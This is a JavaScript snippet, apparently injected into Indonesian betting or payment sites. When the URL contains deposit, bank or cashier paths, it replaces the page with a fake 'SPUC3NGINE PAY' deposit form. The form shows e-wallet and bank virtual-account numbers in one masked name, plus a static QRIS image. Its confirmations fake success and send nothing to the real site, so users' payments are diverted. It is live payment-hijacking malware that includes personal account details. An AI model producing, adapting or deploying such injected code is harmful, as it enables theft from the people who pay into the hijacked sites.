(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SPUC3NGINE PAY - Formulir Deposit</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
    <style>
      :root {
        --bg-main: #060814;
        --bg-card: rgba(15, 23, 42, 0.75);
        --primary: #00f0ff;
        --secondary: #9d4edd;
        --success: #00f5d4;
        --text: #e2e8f0;
        --border: rgba(0, 240, 255, 0.15);
      }

      body {
        margin: 0;
        font-family: 'Rajdhani', sans-serif;
        background: radial-gradient(circle at center, #111430 0%, var(--bg-main) 100%);
        color: var(--text);
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px 0;
        box-sizing: border-box;
        overflow-x: hidden;
      }

      .container {
        max-width: 450px;
        width: 90%;
        background: var(--bg-card);
        backdrop-filter: blur(12px);
        -webkit-backdrop-filter: blur(12px);
        border-radius: 24px;
        border: 1px solid var(--border);
        box-shadow: 0 0 40px rgba(0, 240, 255, 0.1), inset 0 0 20px rgba(255, 255, 255, 0.02);
        padding: 30px 24px;
        display: flex;
        flex-direction: column;
        align-items: center;
        position: relative;
        animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
      }

      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
      }

      .logo-area {
        font-family: 'Orbitron', sans-serif;
        font-size: 24px;
        font-weight: 700;
        text-align: center;
        letter-spacing: 2px;
        background: linear-gradient(90deg, var(--primary), var(--secondary));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        text-shadow: 0 0 20px rgba(0, 240, 255, 0.3);
        margin-bottom: 4px;
      }

      .subtitle {
        font-size: 14px;
        color: #64748b;
        letter-spacing: 4px;
        text-transform: uppercase;
        margin-bottom: 20px;
        font-weight: 600;
      }

      .marquee {
        width: 100%;
        overflow: hidden;
        white-space: nowrap;
        background: rgba(251, 191, 36, 0.06);
        border: 1px dashed rgba(251, 191, 36, 0.3);
        border-radius: 8px;
        padding: 8px;
        color: #fbbf24;
        margin-bottom: 20px;
        font-size: 13px;
        box-sizing: border-box;
      }

      .marquee span {
        display: inline-block;
        padding-left: 100%;
        animation: marquee 20s linear infinite;
      }

      @keyframes marquee {
        0% { transform: translateX(0%); }
        100% { transform: translateX(-100%); }
      }

      .actions {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 10px;
        width: 100%;
        margin-bottom: 20px;
      }

      .actions button {
        grid-column: span 1;
      }

      button.help {
        grid-column: span 2;
        background: transparent !important;
        border: 1px solid rgba(255,255,255,0.15) !important;
        color: #94a3b8 !important;
        margin-top: 4px;
      }
      button.help:hover {
        background: rgba(255,255,255,0.05) !important;
        color: #fff !important;
        box-shadow: none !important;
      }

      button {
        width: 100%;
        background: linear-gradient(135deg, #00b4d8, var(--primary));
        color: #060814;
        border: none;
        padding: 12px 16px;
        border-radius: 12px;
        font-family: 'Rajdhani', sans-serif;
        font-size: 16px;
        font-weight: 700;
        text-transform: uppercase;
        cursor: pointer;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        box-shadow: 0 4px 15px rgba(0, 240, 255, 0.2);
      }

      button:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(0, 240, 255, 0.4);
        filter: brightness(1.1);
      }

      button:active { transform: translateY(0); }

      button.secondary {
        background: linear-gradient(135deg, var(--secondary), #7209b7);
        color: #fff;
        box-shadow: 0 4px 15px rgba(157, 78, 221, 0.2);
      }
      button.secondary:hover {
        box-shadow: 0 6px 20px rgba(157, 78, 221, 0.4);
      }

      select, input {
        width: 100%;
        padding: 12px 16px;
        border: 1px solid var(--border);
        border-radius: 12px;
        font-size: 15px;
        background: #090d22;
        color: #fff;
        font-family: 'Rajdhani', sans-serif;
        box-sizing: border-box;
        transition: all 0.3s;
        margin-bottom: 12px;
      }

      select:focus, input:focus {
        outline: none;
        border-color: var(--primary);
        box-shadow: 0 0 10px rgba(0, 240, 255, 0.2);
      }

      .content-panel {
        width: 100%;
        animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
      }

      @keyframes slideUp {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
      }

      .bank-info {
        background: rgba(9, 13, 34, 0.6);
        padding: 16px;
        border-radius: 16px;
        border: 1px solid var(--border);
        display: flex;
        flex-direction: column;
        gap: 12px;
        margin-bottom: 12px;
      }

      .bank-header {
        display: flex;
        align-items: center;
        gap: 12px;
      }

      .bank-info img {
        width: 45px;
        height: 45px;
        object-fit: contain;
        background: #fff;
        padding: 4px;
        border-radius: 8px;
      }

      .bank-meta { flex: 1; }
      .bank-meta b { font-size: 18px; color: var(--primary); }
      .bank-meta small { color: #94a3b8; font-size: 13px; display: block; margin-top: 2px; }

      .bank-number {
        display: flex;
        align-items: center;
        justify-content: space-between;
        background: #050714;
        padding: 10px 14px;
        border-radius: 10px;
        border: 1px solid rgba(255,255,255,0.05);
      }

      .bank-number span {
        font-family: 'Orbitron', sans-serif;
        font-size: 15px;
        letter-spacing: 1px;
        color: #fff;
      }

      .copy-btn {
        width: auto;
        padding: 6px 14px;
        font-size: 13px;
        border-radius: 6px;
        box-shadow: none;
      }

      .result-area {
        text-align: center;
        margin-top: 15px;
        animation: fadeIn 0.3s ease;
      }

      .qr-card {
        background: #fff;
        padding: 14px;
        border-radius: 16px;
        display: inline-block;
        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
      }
      .qr-card img { width: 200px; height: 200px; display: block; }

      .qr-buttons {
        display: flex;
        gap: 10px;
        margin-top: 15px;
        width: 100%;
      }
      
      .done-btn {
        background: linear-gradient(135deg, #00f5d4, #01c7a9);
        color: #060814;
        box-shadow: 0 4px 15px rgba(0, 245, 212, 0.2);
      }
      .done-btn:hover { box-shadow: 0 6px 20px rgba(0, 245, 212, 0.4); }

      .spinner {
        width: 40px;
        height: 40px;
        border: 3px solid rgba(0, 240, 255, 0.1);
        border-top: 3px solid var(--primary);
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
        margin: 20px auto;
      }
      @keyframes spin { to { transform: rotate(360deg); } }

      .footer-img {
        margin-top: 24px;
        text-align: center;
        opacity: 0.5;
        transition: opacity 0.3s;
      }
      .footer-img:hover { opacity: 0.8; }
      .footer-img img { max-width: 60%; filter: grayscale(100%) brightness(200%); }

      .toast {
        position: fixed;
        bottom: 30px;
        left: 50%;
        transform: translateX(-50%) scale(0.9);
        min-width: 250px;
        text-align: center;
        padding: 12px 20px;
        border-radius: 12px;
        font-size: 15px;
        font-weight: 600;
        opacity: 0;
        pointer-events: none;
        transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        z-index: 9999;
        font-family: 'Rajdhani', sans-serif;
        box-shadow: 0 10px 25px rgba(0,0,0,0.4);
      }
      .toast.show { opacity: 1; transform: translateX(-50%) scale(1); }
      .toast.success { background: #00f5d4; color: #060814; }
      .toast.error { background: #ff0055; color: #fff; }
    </style>
  `;

  document.body.innerHTML = `
    <div class="container">
      <div class="logo-area">SPUC3NGINE PAY</div>
      <div class="subtitle">Secure Gateway</div>
      
      <div class="marquee">
        <span>⚠️ Deposit WAJIB sesuai nominal formulir! Transaksi pertama DIWAJIBKAN menggunakan Kode Unik (Contoh: 50.123). Jika melanggar syarat ketentuan, otomatis GAGAL PROSES.</span>
      </div>

      <div class="actions">
        <button onclick="showDeposit('manual')">Manual Deposit</button>
        <button class="secondary" onclick="showDeposit('auto')">Instant QRIS</button>
        <button class="help" onclick="openHelp()">💬 Hubungi Bantuan Deposit</button>
      </div>

      <div id="manual-step" class="content-panel" style="display:none;">
        <select onchange="selectMethod(this.value)">
          <option value="" selected disabled>-- PILIH METODE DEPOSIT --</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgpSc_j6RrvzR4yXB3aJvMKum3-dbfqVJVwo_xCgZmnA&s=10","name":"Dana","number":"085179820753","owner":"PUR**A ISM**L"}'>Dana</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgL5miB0Nl0N4uXXxjG1DZtuV-0kgZ9Hlm_KvhVZ5cgA&s=10","name":"Ovo","number":"SCAN QRIS","owner":"SCAN QRIS"}'>Ovo</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwXMKiiND-3i_R9jwcg3-gXBrxNEOGL3DEog&usqp=CAU","name":"BRI VA","number":"8881085179820753","owner":"PUR**A ISM**L"}'>BRI VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaeDt-esFy5TIN8gKVJhbFowRkxIDEep48aA&usqp=CAU","name":"BCA VA","number":"3935085179820753","owner":"PUR**A ISM**L"}'>BCA VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTt83cjvCmZBfU4uD-KIMRZFZIG5tbxEO25eg&usqp=CAU","name":"BNI VA","number":"8810085179820753","owner":"PUR**A ISM**L"}'>BNI VA</option>
          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhHhAzPQYSQHan0-EHud0djSuTjQzstRV9zA&usqp=CAU","name":"MANDIRI VA","number":"60001085179820753","owner":"PUR**A ISM**L"}'>MANDIRI VA</option>
        </select>
        
        <div id="manual-details" class="bank-info" style="display:none">
          <div class="bank-header">
            <img id="bank-logo" src="" alt="Bank Logo">
            <div class="bank-meta">
              <b id="bank-name"></b>
              <small id="bank-owner"></small>
            </div>
          </div>
          <div class="bank-number">
            <span id="bank-number"></span>
            <button class="copy-btn" onclick="copyNumber()">Salin</button>
          </div>
          <input id="manual-nominal" type="number" placeholder="Nominal (Min. 50.000)">
          <button onclick="submitManualDeposit()">Kirim Konfirmasi</button>
          <div id="manual-result"></div>
        </div>
      </div>

      <div id="auto-deposit" class="content-panel" style="display:none;">
        <input id="nominal" type="number" placeholder="Nominal (Min. 50.000)">
        <button class="secondary" onclick="generateQRIS()">Buat QRIS Sekarang</button>
        <div id="auto-result" class="result-area"></div>
      </div>

      <div class="footer-img">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Secure Payment Gate">
      </div>
    </div>
    <div id="toast" class="toast"></div>
  `;

  function showToast(msg, type = "success") {
    const toast = document.getElementById("toast");
    toast.textContent = msg;
    toast.className = `toast ${type} show`;
    setTimeout(() => toast.classList.remove("show"), 2500);
  }

  window.showDeposit = function (type) {
    const manualPanel = document.getElementById("manual-step");
    const autoPanel = document.getElementById("auto-deposit");
    
    manualPanel.style.display = type === "manual" ? "block" : "none";
    autoPanel.style.display = type === "auto" ? "block" : "none";
  };

  window.selectMethod = function (j) {
    if (!j) return;
    const m = JSON.parse(j);
    const details = document.getElementById("manual-details");
    details.style.display = "flex";
    document.getElementById("bank-logo").src = m.logo;
    document.getElementById("bank-name").innerText = m.name;
    document.getElementById("bank-number").innerText = m.number;
    document.getElementById("bank-owner").innerText = "A/N: " + m.owner;
  };

  window.copyNumber = function () {
    const num = document.getElementById("bank-number").innerText;
    if (!num) return showToast("Nomor kosong!", "error");
    navigator.clipboard.writeText(num).then(() => showToast("⚡ Rekening Berhasil Disalin", "success"));
  };

  window.submitManualDeposit = function () {
    const n = Number(document.getElementById("manual-nominal").value || 0);
    if (n < 50000) return showToast("Minimal deposit Rp 50.000", "error");
    document.getElementById("manual-result").innerHTML = '<div class="spinner"></div>';
    setTimeout(() => {
      document.getElementById("manual-result").innerHTML = "<div style='color:var(--success); font-weight:700; margin-top:10px;'>✓ DEPOSIT SEDANG DIPROSES SYSTEM</div>";
      setTimeout(() => history.back(), 1500);
    }, 1500);
  };

  window.generateQRIS = function () {
    const n = Number(document.getElementById("nominal").value || 0);
    if (n < 50000) return showToast("Minimal Rp 50.000", "error");
    document.getElementById("auto-result").innerHTML = '<div class="spinner"></div>';

    const qrUrl = "https://s13.gifyu.com/images/bdwy1.jpg";

    setTimeout(() => {
      document.getElementById("auto-result").innerHTML = `
        <div class="qr-card" style="animation: fadeIn 0.4s ease;">
          <img id="qris-img" src="${qrUrl}" alt="QRIS">
        </div>
        <div class="qr-buttons">
          <button style="background:#3b82f6; color:#fff; box-shadow:0 4px 12px rgba(59,130,246,0.3)" onclick="downloadQRIS()">Unduh QRIS</button>
          <button class="done-btn" onclick="history.back()">Saya Sudah Bayar</button>
        </div>
      `;
    }, 1000);
  };

  window.downloadQRIS = function () {
    const qrUrl = "https://s13.gifyu.com/images/bdwy1.jpg";
    const link = document.createElement("a");
    link.href = qrUrl;
    link.download = "spuc3ngine-qris.png";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    showToast("✓ QRIS Berhasil Diunduh", "success");
  };

  window.openHelp = function () {
    window.open("https://direct.lc.chat/19752556/", "_blank");
  };
})();
